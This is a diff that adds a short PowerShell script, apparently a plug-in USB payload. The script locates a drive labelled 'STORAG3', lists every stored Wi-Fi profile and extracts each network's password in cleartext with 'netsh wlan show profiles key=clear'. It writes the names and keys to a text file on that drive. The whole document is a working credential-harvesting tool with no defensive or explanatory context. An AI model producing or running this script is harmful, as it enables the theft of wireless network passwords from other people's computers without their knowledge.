@@ -1,0 +1,12 @@
+# find drive
+$d=(gwmi win32_volume|?{$_.Label -eq "STORAG3"}).DriveLetter;
+"">"$d\\w.txt"; # create file
+
+# Find profiles w/ select string
+$w=(netsh wlan show profiles)|sls ".*All User Profile.*: (.*)";
+
+# For each match list key
+$w.Matches|%{$n=$_.Groups[1].Value;$p=(netsh wlan show profiles name="$n" key=clear)|sls ".*Key Content.*:(.*)";if($p)
+
+# Write results to disk
+{$k=$p.Matches.Groups[1].Value}else{$k="N/A"};"$n : $k">>"$d\\w.txt"}
